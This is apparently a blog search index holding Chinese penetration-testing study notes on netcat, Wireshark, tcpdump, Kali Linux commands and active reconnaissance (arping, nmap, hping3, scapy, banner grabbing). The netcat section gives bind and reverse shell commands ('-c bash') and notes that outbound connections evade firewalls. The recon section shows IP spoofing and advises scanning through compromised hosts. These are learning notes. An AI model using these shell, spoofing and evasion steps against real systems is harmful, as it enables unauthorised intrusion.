        <content type="html"><![CDATA[<h3 id="渗透测试——基本工具"><a href="#渗透测试——基本工具" class="headerlink" title="渗透测试——基本工具"></a>渗透测试——基本工具</h3><h4 id="一、NETCAT（nc"><a href="#一、NETCAT（nc" class="headerlink" title="一、NETCAT（nc)"></a>一、NETCAT（nc)</h4><ul><li>网络工具中的瑞士军刀（小身材、大智慧）</li><li>侦听模式/传输模式</li><li>telent/获取banner信息</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件</li><li>远程控制/木马</li><li>加密所有流量</li><li>流媒体服务器</li><li>远程克隆硬盘</li></ul><p><strong>NC（TELNET/BANNER功能）</strong></p><ul><li>nc -nv 1.1.1.1 110</li><li>nc -nv 1.1.1.1 25</li><li>nc -nv 1.1.1.1 80</li></ul><p>nc作为客户端时，可以对服务器端进行侦听</p><p><strong>示例：</strong></p><p>ping pop3.163.com  #查看163邮箱pop3的IP地址</p><p>nc -nv 123.125.50.29 110 #n只跟IP地址，不对DNS地址进行解析；v显示详细输出信息；参数后面跟                                                服务IP和端口</p><p>user   邮箱用户名（base64编码）   邮箱密码（base64编码）</p><p>通过以上命令可以在命令行下接受邮件。</p><h5 id="NC（传输文本信息）"><a href="#NC（传输文本信息）" class="headerlink" title="NC（传输文本信息）"></a><strong>NC（传输文本信息）</strong></h5><p><strong>示例</strong>：</p><p>服务器端：nc -l -p 3333  #-l 表示侦听 -p指定打开的端口号</p><p>​                   netstat -pantu | grep 3333 #查看3333端口是否打开</p><p>客户端： nc -nv 192.168.1.132 3333 #参数后面跟服务器的IP地址和开放的端口。</p><h5 id="NC（远程电子取证信息收集"><a href="#NC（远程电子取证信息收集" class="headerlink" title="NC（远程电子取证信息收集)"></a><strong>NC（远程电子取证信息收集)</strong></h5><p><strong>示例1：</strong></p><p>A对B当前目录信息进行取证</p><p>A：nc -l -p 3333 #-l表示侦听 -p指定打开的端口号 A对3333端口开始侦听</p><p>B：ls -l | nc -nv 192.168.153.132 3333 #将当前目录下的文件属性列表信息传递给A。</p><p><strong>示例2：</strong></p><p>A对B当前系统进程信息进行取证并存档</p><p>A:nc -l -p 3333&gt;ps.txt #侦听3333端口，并把侦听内容重定向到当前目录的1.txt文件里</p><p>B:ps aux | nc -nv 192.168.153.132 -q 1 #将当前系统进程信息进行取证并存档到1.txt中  -q表示自动                                                                        断开nc连接</p><p>A:cat ps.txt #查看ps.txt文件内容</p><p>远程电子取证信息收集尽量少的去对目标机器进行修改。</p><h5 id="NC（传输文件）"><a href="#NC（传输文件）" class="headerlink" title="NC（传输文件）"></a><strong>NC（传输文件）</strong></h5><p><strong>正向文件运输</strong></p><p>A：mc -l -p 3333&gt;1.mp4 #侦听端为文件接受端，接受对方3333端口发送的文件并命名为1.mp4</p><p>B：nc -nv 192.168.153.132 3333 &lt;1.mp4 -q 1 #文件发送端</p><p><strong>反向文件运输</strong></p><p>A: nc -lp 3333&lt; 1.mp4 -q 1 #侦听端为文件发送端，将1.mp4这个文件放在3333侦听端口上等待对方接收</p><p>B: nc -nv 192.168.0.5 3333&gt; 1.mp4  #文件接收端</p><h5 id="NC（传输目录）"><a href="#NC（传输目录）" class="headerlink" title="NC（传输目录）"></a><strong>NC（传输目录）</strong></h5><h5 id="NC（流媒体服务"><a href="#NC（流媒体服务" class="headerlink" title="NC（流媒体服务)"></a><strong>NC（流媒体服务)</strong></h5><p><strong>示例：</strong></p><p>A：cat 1.mp4 | nc -l -p 3333  #A端为流媒体输出端，将1.mp4这个文件打开并通过3333端口进行输                                                        出</p><p>B：nc -nv 192.168.153.130 | mplayer -vo x11 -cache 3000 #B端为流媒体客户端，将侦听A端3333                    端口，并通过mplayer媒体播放器进行播放，设定缓存为3000K</p><h5 id="NC（端口扫描）"><a href="#NC（端口扫描）" class="headerlink" title="NC（端口扫描）"></a><strong>NC（端口扫描）</strong></h5><p><strong>示例：</strong></p><p>nc -nvz 192.168.153.130 1-65535 #扫描目标主机TCP 1-65535开放的端口</p><p>nc -nvzu 192.168.153.130 1-65535 #扫描目标主机UDP 1-1024开放的端口</p><h5 id="NC（远程控制）"><a href="#NC（远程控制）" class="headerlink" title="NC（远程控制）"></a><strong>NC（远程控制）</strong></h5><p>服务器端开启远程控制：</p><p>服务器：nc -lp port -c bash#把shell交给过来连接的客户端</p><p>客户端：nc -nv ip port </p><p>客户端开启远程控制：</p><p>服务器端：nc -lp port</p><p>客户端：nc -nv IP port -c bash </p><p>window上将-c bash 改为-c cmd</p><p>注意事项：服务器防火墙一般会限制外网对内网的访问，但是内网对外网的访问限制可能被忽略。</p><p>​                    内网对外网的访问限制：将DNS服务器单独隔离出来，只开放53端口开放侦听外网，</p><p>​                    主动在客户端开启一个端口，并在服务器上侦听该端口，且把shell交给客户端。这种方式不容易被防火墙拦截。</p><h5 id="NC的缺陷"><a href="#NC的缺陷" class="headerlink" title="NC的缺陷"></a><strong>NC的缺陷</strong></h5><p>缺乏数据加密和身份认证的能力</p><h5 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a><strong>NCAT</strong></h5><p>nmap工具包中的ncat，设计用于弥补NC的缺陷。</p><p>nc版本太多，参数各不相同，使用起来有困难。</p><p>Ubantu版本没有-c，需要用临时文件去转换bash</p><p>遇到问题查看man命令手册（系统自带软件）</p><p>服务端开启端口：ncat -c bash –allow IP(指定可连接的客户端IP）-vnl port –ssl（防止嗅探者查看到明文信息）</p><p>客户端连接：ncat -nv IP port  –ssl    互相交换指纹是一对一连接，保证安全。</p><h4 id="二、WIRESHARK"><a href="#二、WIRESHARK" class="headerlink" title="二、WIRESHARK"></a>二、WIRESHARK</h4><p><strong>常用功能</strong></p><ul><li>抓包嗅探协议分析</li><li>抓包引擎</li><li>Libpcap9–Linux</li><li>winpcap10-windows</li></ul><p><strong>基本使用方法：</strong></p><p>1、终端输入wireshark，启动</p><p> 2、选择要抓包的网卡。</p><p> 3、打开捕获选项，勾选混杂模式（只抓捕本地信息（网卡绑定的ip地址信息），如果不选择捕获模式则无法获取广播（当前网络中的所有信息）信息）。</p><p>4、选择捕获过滤器,可以选择要抓包的内容，如ip地址 格式 host ip地址或者其他协议。</p><p> 5、停止抓包后保存内容，尽量使用pcap格式。兼容性较好。</p><p> 6、通过分析-显示过滤器对抓包结果进行过滤</p><p><strong>数据包的分层结构</strong></p><ul><li>Arp</li><li>lcmp</li><li>Tcp三次握手</li></ul><p>1.源向目标发送syn包（确认连接）</p><p>2.目标向源发送syn、ack（回应并向源确认）</p><p>3.源向目标发送ack包（回应目标发送的syn）</p><ul><li>Udp</li><li>Dns</li><li>http</li><li>ftp</li></ul><p><strong>数据流</strong></p><ul><li>TCP流</li><li>UDP流</li><li>SSL流</li><li>HTTP流</li></ul><h4 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h4><h5 id="tcpdump——抓包"><a href="#tcpdump——抓包" class="headerlink" title="tcpdump——抓包"></a>tcpdump——抓包</h5><p>​       wireshark是图形化工具，在服务器等没有图形化界面的设备上无法使用，此时tcpdump命令行工具可以代替</p><pre><code>tcpdump -i eth0 -s 0 -w a.cap/b.pcap</code></pre><p>-i 指定抓包接口，-s 指定抓包大小，0为抓取整个包，不指定则默认抓取64字节。-w 将抓到的包保存到某个文件，不指定则实时显示</p><pre><code>tcpdump -r a.cap/b.cap</code></pre><p>-r read读取</p><pre><code>tcpdump -A -r a.cap/b.cap</code></pre><p>-A 使用ascii码表转码显示，不要加在-r后面，不然会报错 -X 使用16进制显示</p><h5 id="tcpdump——抓包筛选器"><a href="#tcpdump——抓包筛选器" class="headerlink" title="tcpdump——抓包筛选器"></a>tcpdump——抓包筛选器</h5><pre><code>tcpdump -i eth0 port 22</code></pre><p>抓以太网0上22端口的包。</p><pre><code>tcpdump -i eth0 tcp port 22</code></pre><p>抓以太网0上22端口的TCP包。 curl -v URL</p><h5 id="tcpdump——显示筛选器"><a href="#tcpdump——显示筛选器" class="headerlink" title="tcpdump——显示筛选器"></a>tcpdump——显示筛选器</h5><pre><code>tcpdump -n -r http.cap | awk &#39;{print $3}&#39; | sort -u</code></pre><p>-n 不对IP进行域名解析  AWK 默认用空格做分割 -u unique去重</p><pre><code>tcpdump -n src host IP -r file.cap/file.pcap</code></pre><p>src host IP 指定来源IP，src–&gt;source</p><pre><code>tcpdump -n dst host IP -r file.cap/file.pcap</code></pre><p>dst destination，指定目标IP</p><pre><code>tcpdump -n udp port 53  -r file.cap/file.pcap</code></pre><p>udp 指定显示的协议  port 53 指定端口</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux安装</title>
      <link href="/2020/03/12/linux-an-zhuang/"/>
      <url>/2020/03/12/linux-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h3 id="kali-linux安装部分相关知识"><a href="#kali-linux安装部分相关知识" class="headerlink" title="kali linux安装部分相关知识"></a>kali linux安装部分相关知识</h3><h4 id="kali安装"><a href="#kali安装" class="headerlink" title="kali安装"></a>kali安装</h4><h5 id="硬盘安装"><a href="#硬盘安装" class="headerlink" title="硬盘安装"></a>硬盘安装</h5><ul><li><p>下载安装镜像</p><p><a href="https://www.kali.org/downloads" target="_blank" rel="noopener">https://www.kali.org/downloads</a></p></li><li><p>验证hash值</p></li><li><p>制作启动光盘</p><p>live</p></li><li><p>制作启动U盘</p></li><li><p>设置BIOS启动顺序</p></li><li><p>启动安装</p></li></ul><h5 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h5><ul><li>虚拟化和Docker</li><li>kali Docker image<ul><li><a href="https://www.kali.org/news/official-kali-linux-docker-images/" target="_blank" rel="noopener">https://www.kali.org/news/official-kali-linux-docker-images/</a></li><li><a href="https://github.com/offensive-security/kali-linux-docker" target="_blank" rel="noopener">https://github.com/offensive-security/kali-linux-docker</a></li></ul></li></ul><h5 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h5><ul><li>官方VM镜像</li><li>vmware workstation</li><li>virtualBox<ul><li>下载、安装、扩展工具、基本使用</li><li>win8系统</li><li>安装kali</li><li>安装tools</li></ul></li></ul><h4 id="熟悉环境"><a href="#熟悉环境" class="headerlink" title="熟悉环境"></a>熟悉环境</h4><ul><li>登录密码</li><li>TOP 10安全工具</li><li>字体调整</li><li>强行终止程序</li><li>文件目录</li><li>共享文件</li></ul><h4 id="常见linux命令"><a href="#常见linux命令" class="headerlink" title="常见linux命令"></a>常见linux命令</h4><p>*<em>chmod *</em>控制文件如何被他人所调用</p><ul><li><p>​    u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。</p></li><li><p>+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。</p></li><li><p>r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。</p><p>数字来表示权限</p></li></ul><p>​    r=4,w=2,x=1</p><ul><li>若要rwx属性则4+2+1=7；</li><li>若要rw-属性则4+2=6；</li><li>若要r-x属性则4+1=5。<ul><li>​    chmod ugo+r test.txt ，chmod a+r file1.txt  #将文件设为所有人皆可读取</li><li>chmod 777 test.txt  #用数字来表示权限</li></ul></li></ul><p><strong>ls</strong> 显示目录下文件 </p><ul><li>-l    列出文件详细信息</li><li>-a   列出当前目录下所有文件及目录，包括隐藏文件</li></ul><p><strong>mkdir</strong> 创建目录</p><ul><li>-p 创建目录，若无父目录，则创建p(parent)</li></ul><p><strong>pwd</strong> 查看当前工作目录</p><p><strong>cp</strong>:复制文件</p><p><strong>cd</strong> #切换目录</p><ul><li>cd ~ #跳到自己的home目录</li></ul><p><strong>touch:</strong>创建空文件</p><p><strong>echo:</strong>创建带有内容的文件</p><p><strong>cat</strong> 查看文件内容</p><ul><li>n 或 –number：由 1 开始对所有输出的行数编号。</li><li>-b 或 –number-nonblank：和 -n 相似，只不过对于空白行不编号。</li><li>-s 或 –squeeze-blank：当遇到有连续两行以上的空白行，就代换为一行的空白行。</li><li>-v 或 –show-nonprinting：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外。</li><li>-E 或 –show-ends : 在每行结束处显示 $。</li><li>-T 或 –show-tabs: 将 TAB 字符显示为 ^I。</li><li>-A, –show-all：等价于 -vET。</li><li>-e：等价于”-vE”选项；</li><li>-t：等价于”-vT”选项；</li></ul><p><strong>fInd</strong>  在文件系统中搜索某文件</p><ul><li>​    find / name <em>xxx\</em>.c  #模糊查找目录下的文件<ul><li>​    find /var/log -type f -mtime +7  -ok rm {} \  #查找/var/log目录中更改时间在7日以前的普通文                                                                                    件，并在删除之前询问它们： </li><li>find . -type f -perm 644 -exec ls -l {} \   #查找前目录中文件属主具有读写权限                                                                    </li></ul></li></ul><p><strong>wc</strong> 统计文本中行数、字数、字符数</p><p><strong>grep</strong> 在文本文件中查找某个字符串</p><ul><li>grep “被查找的字符串“ 文件名</li><li>grep  -e “正则表达式“ 文件名</li><li>grep -i  “被查找的字符串” 文件名    #忽略大小写</li></ul><p><strong>pwd</strong> 显示当前目录</p><p><strong>more less</strong> 分页显示文本文件内容</p><p><strong>head tail</strong> 显示文件头、尾内容</p><p><strong>mv</strong> 移动或重命名</p><p><strong>us</strong> #切换管理员目录</p><p><strong>./文件名</strong>  #执行文件</p><p><strong>rm</strong> 文件名 #删除文件</p><p><strong>rm -r</strong> 文件夹名 #删除文件夹</p><h5 id="二、Linux系统管理命令"><a href="#二、Linux系统管理命令" class="headerlink" title="二、Linux系统管理命令"></a>二、Linux系统管理命令</h5><p><strong>chmod</strong>控制文件如何被他人所调用。</p><p><strong>stat</strong>        显示指定文件的详细信息，比ls更详细</p><p><strong>who</strong>        显示在线登陆用户</p><p><strong>whoami</strong>      显示当前操作用户</p><p><strong>hostname</strong>    显示主机名</p><p><strong>uname</strong>      显示系统信息</p><p><strong>top</strong>         动态显示当前耗费资源最多进程信息</p><p><strong>ps</strong>          显示瞬间进程状态 ps -au</p><ul><li>ps -A    #显示进程信息</li><li>ps -u root     #显示root用户进程信息</li><li>ps -aux      # 显示所有包含其他使用者的行程</li></ul><p><strong>du</strong>          查看目录大小 du -h /home带有单位显示目录信息</p><p><strong>df</strong>          查看磁盘大小 df -h 带有单位显示磁盘信息</p><p><strong>ifconfig</strong>      查看网络情况</p><p><strong>ping</strong>         测试网络连通</p><p><strong>netstat</strong>      显示网络状态信息</p><p><strong>clear</strong>        清屏</p><p><strong>alias</strong>        对命令重命名 如：alias showmeit=”ps -aux” ，另外解除使用unaliax showmeit</p><p><strong>kill</strong>         杀死进程，可以先用ps 或 top命令查看进程的id，然后再用kill命令杀死进程。</p><ul><li>kill -9  $(ps -ef | grep hnlinux)  #过滤出hnlinux用户进程</li><li>kill -u hnlinux  #方法二</li><li>kill -KILL 123456+  #强制杀死进程</li></ul><h5 id="三、vim使用"><a href="#三、vim使用" class="headerlink" title="三、vim使用"></a>三、vim使用</h5><p>vim三种模式：命令模式、插入模式、编辑模式。使用ESC或i或：l来切换模式。</p><p>命令模式下：</p><p><strong>q</strong>            退出</p><p><strong>:q!</strong>           强制退出</p><p><strong>:wq</strong>          保存并退出</p><p><strong>:set number</strong>   显示行号</p><p><strong>:set nonumber</strong>  隐藏行号</p><p><strong>/apache</strong>       在文档中查找apache 按n跳到下一个，shift+n上一个</p><p><strong>yyp</strong>          复制光标所在行，并粘贴</p><p>(左移一个字符←)、j(下一行↓)、k(上一行↑)、l(右移一个字符→)</p><h5 id="四、Kali-Linux目录结构（文件系统）"><a href="#四、Kali-Linux目录结构（文件系统）" class="headerlink" title="四、Kali Linux目录结构（文件系统）"></a>四、Kali Linux目录结构（文件系统）</h5><p><strong>bin</strong> 所有用户都可以使用的程序目录</p><p><strong>boot</strong> 引导程序GRUB等的存放目录</p><p><strong>dev</strong> 存放所有的设备目录</p><p><strong>etc</strong> 主要的存放配置文件的目录</p><p><strong>home</strong> 用户主目录 </p><p><strong>lib</strong> 库文件目录</p><p><strong>live-bulid</strong> build自己的kali版本的目录</p><p><strong>media</strong> 默认挂载外接存储的目录</p><p><strong>mnt</strong> 以前的linux常用的挂载目录</p><p><strong>usr</strong> 存放执行程序、共享文件</p><p><strong>var</strong> 存放日志、邮件等经常变化的内容。</p><h5 id="五、文件读写权限"><a href="#五、文件读写权限" class="headerlink" title="五、文件读写权限"></a>五、文件读写权限</h5><p>三种基本权限</p><p><strong>R</strong>      读     数值表示为4</p><p><strong>W</strong>     写     数值表示为2</p><p><strong>X</strong>      可执行  数值表示为1</p><h5 id="六、打包压缩命令"><a href="#六、打包压缩命令" class="headerlink" title="六、打包压缩命令"></a>六、打包压缩命令</h5><p><strong>gzip：</strong></p><ul><li>gzip *            #压缩目录下的所有文件</li><li>gzip -dv *    #解压文件，并列出详细信息</li></ul><p><strong>bzip2：</strong></p><p><strong>tar:</strong>         打包压缩</p><p>   <strong>-c</strong>        归档文件</p><p>   <strong>-x</strong>        压缩文件</p><p>   <strong>-z</strong>        gzip压缩文件</p><p>   <strong>-j</strong>        bzip2压缩文件</p><p>   <strong>-v</strong>        显示压缩或解压缩过程 v(view)</p><p>   <strong>-f</strong>        使用档名</p><p>例：</p><p><strong>tar -cvf /home/abc.tar /home/abc</strong>        只打包，不压缩</p><p><strong>tar -zcvf /home/abc.tar.gz /home/abc</strong>     打包，并用gzip压缩</p><p><strong>tar -jcvf /home/abc.tar.bz2 /home/abc</strong>    打包，并用bzip2压缩</p><p>当然，如果想解压缩，就直接替换上面的命令 tar -cvf / tar -zcvf / tar -jcvf 中的“c” 换成“x” 就可以了。</p><h5 id="七、linux管道"><a href="#七、linux管道" class="headerlink" title="七、linux管道"></a>七、linux管道</h5><p>将一个命令的标准输出作为另一个命令的标准输入</p><p>例：grep -r “close” /home/* | more    在home目录下所有文件中查找，包括close的文件，并分页输出。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试——主动信息收集</title>
      <link href="/2020/03/12/shen-tou-ce-shi-zhu-dong-xin-xi-shou-ji/"/>
      <url>/2020/03/12/shen-tou-ce-shi-zhu-dong-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="主动信息收集部分"><a href="#主动信息收集部分" class="headerlink" title="主动信息收集部分"></a>主动信息收集部分</h3><h4 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h4><ul><li><p>直接与目标主机交互</p></li><li><p>无法避免留下发文的痕迹；</p></li><li><p>使用受控的第三方电脑进行探测；</p></li><li><p>使用代理或者已经被控制的主机</p></li><li><p>做好被封杀的准备</p></li><li><p>使用噪音迷惑目标，淹没真实的探测流量</p></li><li><p>扫描-发送不同的探测，根据返回结果判断目标状态</p></li></ul><h4 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h4><ul><li>识别活着的主机</li><li>潜在的被攻击目标</li><li>输出一个IP地址列表</li><li>网络2、3、4层发现</li></ul><p>包括ARP、IPv4、IPv6、ICMP、IPSec、TCP、UDP</p><h4 id="发现——二层发现"><a href="#发现——二层发现" class="headerlink" title="发现——二层发现"></a>发现——二层发现</h4><p>优点：扫描速度快，可靠</p><p>缺点：不可路由</p><h5 id="Arp协议"><a href="#Arp协议" class="headerlink" title="Arp协议"></a>Arp协议</h5><ul><li><p>抓包</p></li><li><p>arping 1.1.1.1 -c 1</p></li><li><p>arping 1.1.1.1 -d</p><p>发现重复响应，不同mac地址拥有相同的IP时，退出返回1</p><p> arp地址欺骗：在你的网络里有另外一个IP地址，声称自己是网关IP，发给网关的数据包就会发给欺骗的主机，该主机的所有者就可以在其机器上抓包，实现中间人攻击，嗅探甚至修改通过该主机传输的数据包，窃取密码，篡改数据，实现一些恶意攻击。</p></li><li><p>arping -c 1.1.1.1 grep “bytes from”|cut -d “ “ -f 5|cut -d “(“ -f 2 |cut -d “)” -f 1</p></li><li><p>脚本：</p><p>arping1.sh eth0&gt;addrs</p></li></ul><p>​       arping2.sh addrs    </p><h5 id="nmap二层发现"><a href="#nmap二层发现" class="headerlink" title="nmap二层发现"></a>nmap二层发现</h5><ul><li>nmap 1.1.1.1-254 -sn</li><li>nmap 1.1.1.1/24 -sn</li></ul><p>​          -sn ping扫描，禁用端口扫描</p><ul><li>​    nmap -iL iplist.txt -sn （扫描文件内IP，类似arping2.sh功能）</li></ul><h5 id="Netdiscover–二层发现"><a href="#Netdiscover–二层发现" class="headerlink" title="Netdiscover–二层发现"></a>Netdiscover–二层发现</h5><ol><li>专用于二层发现</li><li>可用于无线和交换网络环境</li><li>主动和被动探测</li></ol><p><strong>主动</strong></p><p>netdiscover -i eth0 -r 192.168.1/24</p><p>netdiscover -i iplist.txt</p><p><strong>被动</strong></p><p>netdiscover -p  #将本地网卡赋值为混杂模式，非本网卡的数据包也会被侦听到</p><p>主动arp容易触发报警</p><h5 id="Scapy-二层发现"><a href="#Scapy-二层发现" class="headerlink" title="Scapy-二层发现"></a>Scapy-二层发现</h5><p>•作为Python库进行调用</p><p>•也可作为单独的工具使用</p><p>•抓包、分析、创建、修改、注入网络流量</p><p>• apt-get install python-gnuplot #安装python-gnuplot组件</p><p>• Scapy  #启动Scapy</p><h4 id="发现-三层发现"><a href="#发现-三层发现" class="headerlink" title="发现-三层发现"></a>发现-三层发现</h4><p>IP,icmp协议  网络控制管理层</p><p>路径发现，主机网络通断的诊断</p><p>优点：可路由，速度快。</p><p>缺点：速度比二层慢，经常被边界防火墙过滤。</p><h5 id="ping-icmp"><a href="#ping-icmp" class="headerlink" title="ping(icmp)"></a>ping(icmp)</h5><ul><li>ping 192.168.1.1 -c 2（设置发包的数量）</li><li>路由追踪：traceroute <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a></li><li>ping -R 192.168.1.1</li><li>ping 192.168.1.1 -c 1 | grep “bytes from”|cut -d “” -f 4 | cut -d “.” -f 1</li></ul><h5 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a>Scapy</h5><p>OSI多层堆叠手工声称ICMP包-IP/icmp</p><ul><li>i=Ip()</li><li>i.dst=”192.168.1.1”（目标IP地址）</li><li>p=ICMP()</li><li>a=str(i/p)</li><li>a.display()</li></ul><h5 id="Nmap——三层发现"><a href="#Nmap——三层发现" class="headerlink" title="Nmap——三层发现"></a>Nmap——三层发现</h5><p>nmap -sn 192.168.1/24  (-sn在同一网段，用arp，不同网段，用ICMP)</p><h5 id="fping-——三层发现"><a href="#fping-——三层发现" class="headerlink" title="fping ——三层发现"></a>fping ——三层发现</h5><ul><li>fping 1.1.1.1 -c 1 （会显示包大小、响应时间、丢包率）</li><li>fping -g 1.1.1.1  1.1.1.2(起始参数 结束参数)</li><li>fping -g 1.1.1.0/24</li><li>fping -f iplist.txt</li></ul><h5 id="hping——三层发现"><a href="#hping——三层发现" class="headerlink" title="hping——三层发现"></a>hping——三层发现</h5><ul><li>Hping(功能强大)</li><li>能够发送几乎任意TCP/IP包</li><li>功能强大但每次只能扫描一个目标</li><li>hping3 192.168.1.1 –icmp -c 5(发5个ping包)</li><li>for addr in $(seq 1 254); do hping3 192.168.1.$addr –icmp -c 5 &gt;&gt; handle.txt &amp; done</li></ul><h4 id="发现——四层扫描"><a href="#发现——四层扫描" class="headerlink" title="发现——四层扫描"></a>发现——四层扫描</h4><p>优点</p><ul><li>可路由且结果可靠</li><li>不太可能被防火墙过滤</li><li>甚至可以发现所有端口都被过滤的主机</li></ul><p>缺点</p><ul><li>基于状态过滤的防火墙可能过滤扫描</li><li>全端口扫描速度慢</li></ul><p>TCP(三次握手)</p><p>未经请求的ACK-RST（非正常通信：目标在线）</p><p>SYN-SYN/ACK、RST(正常通信：目标在线)</p><p>UDP</p><p>目标IP不在线，无响应，目标IP在线、探测的端口也是开放状态，目标主机不会回复；只有一种情况可以探测：我发向目标IP一个没有开放的端口，对方回复一个ICNP端口不可达、一去不复返。</p><p>ACK—Tcp  Port—-RST(如果返回rst则在线)</p><p>scapy：</p><p>\1. i=IP()</p><p>\2. t=TCP()</p><p>3.r=(i/t)</p><p>4.r[tcp].flags=’A’（表示发ack包）</p><p>r[IP].dst=”1.1.1.1”</p><p>a=sr1(r)</p><p>a.display()(查看返回的包)</p><p>a=sr1(IP(dst=”1.1.1.1”)/TCP(dport=80,flags=’A’),timeout=1)</p><p>UDP—–UDP Port—–icmp</p><p>1.u=UDP()</p><p>2.u.deport=33333</p><p>3.r=(i/u)</p><p>4.a=sr1(r.timeout=1,verbose=1)</p><p>5.a.display()</p><p>6.a=sr1(r)</p><p>port-unreachable(目标端口不可达)</p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h5><p>str1(dst=”192.168.1.1”/TCP(dport=80),timeout=1,verbose=1)</p><p>操作系统莫名接受一个syn/ack包，会自动给目标服务器回复一个rst包</p><h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>nmap -sS 1.1.1.1 -p 80,21,25,443</p><p>可以不加-sS 默认是-sS</p><p>-p 1-100 扫描1到100</p><p>-p 全扫描</p><p>–open 只显示open的端口</p><p>nmap -sS -iL test.txt -p 80</p><h5 id="hping3"><a href="#hping3" class="headerlink" title="hping3:"></a>hping3:</h5><p>hping3 1.1.1.1 –scan 80,21,25 -S</p><p>hping3 1.1.1.1 –scan 0-65535 -S</p><p>hping3 -c 10 -S –spoof 192.168.1.140 -p ++1 192.168.1.1</p><p>-c 发包数量 –spoof欺骗伪造成另一个IP</p><p>++1端口号每次+1</p><h5 id="全连接端口扫描"><a href="#全连接端口扫描" class="headerlink" title="全连接端口扫描"></a>全连接端口扫描</h5><p>全连接对scapy比较困难</p><p>特殊情况下隐蔽扫描无法准确检测</p><p>把操作系统返回的rst包被iptable过滤掉,建立完整的连接</p><p>iptables -A OUTPUT -p tcp –tcp-flags RST RST -d 192.168.1.134 -j DROP</p><p>-d 目标ip</p><p>scapy脚本</p><p><strong>nmap:</strong></p><p>nmap -sT 1.1.1.1 -p 80,21</p><p>nmap -sT 1.1.1.1 -p 80-2000</p><p>nmap -sT -iL test.txt -p 80</p><p>不加-p 默认1000个常用端口</p><p><strong>dmitry:</strong></p><p>功能简单,但使用简便,默认150个做常用端口</p><p>dmitry -p 1.1.1.1  //tcp扫描</p><p>dmitry -p 1.1.1.1 -o output</p><p>-o 保存到文件</p><p><strong>nc:</strong></p><p>nc -nv -w l -z 1.1.1.1 1-100</p><p>-w 超时时间</p><h4 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h4><ul><li><p>识别开发端口上运行的应用</p></li><li><p>识别目标操作系统</p></li><li><p>提高攻击效率</p><ul><li>Banner捕获</li><li>服务识别</li><li>操作系统识别</li><li>SNMP分析</li><li>防火墙识别</li></ul><h5 id="服务扫描——banner"><a href="#服务扫描——banner" class="headerlink" title="服务扫描——banner"></a>服务扫描——banner</h5><ul><li>软件开发商</li><li>软件名称</li><li>服务类型</li><li>版本号</li><li>直接发现已知的漏洞和弱点</li></ul></li><li><p>连接建立后直接获取banner</p></li><li><p>另类服务识别方法</p><ul><li>特征行为和响应字段</li><li>不同的响应可用于识别底层操作系统</li></ul><p><strong>Python socket</strong></p><ul><li><p>Socket模块用于连接网络服务</p><pre><code>import socketbangrab=socket.socket(socket.AF_INET,socket.SOCK_STREAM)bangrab.connect((&quot;1.1.1.1&quot;,21))bangrab.recv(4096)bangrab.close()exit()</code></pre></li><li><p>Banner不允许抓取，recv函数无返回将挂起！</p></li></ul><p><strong>dmitry</strong></p><ul><li><code>dmitry -p 192.168.153.131</code></li><li><code>dmitry -pb 192.168.153.131</code></li></ul><p><strong>nmap</strong></p><p><code>nmap -sT 192.168.153.131 -p 22 --script=banner.nse</code></p><p><strong>amap</strong></p><ul><li><code>amap -B 192.168.153.131 21</code></li><li><code>amap -B 192.168.153.131 1-65535</code></li><li><code>amap -B  192.168.153.131|grep on</code></li></ul><p>banner信息抓取能力有限</p><p>nmap响应特征分析识别服务</p><ul><li>发送系列复杂的探测</li><li>依据响应特征signature</li><li><code>nc  -nv 1.1.1.1 80</code></li><li><code>nmap 1.1.1.1 -p 80 -sV</code></li></ul><h5 id="服务扫描——SNMP"><a href="#服务扫描——SNMP" class="headerlink" title="服务扫描——SNMP"></a>服务扫描——SNMP</h5><ul><li><p>简单网络管理协议</p></li><li><p>Community strings</p></li><li><p>信息查询或重新配置</p><p>识别和绕过防火墙筛选</p></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
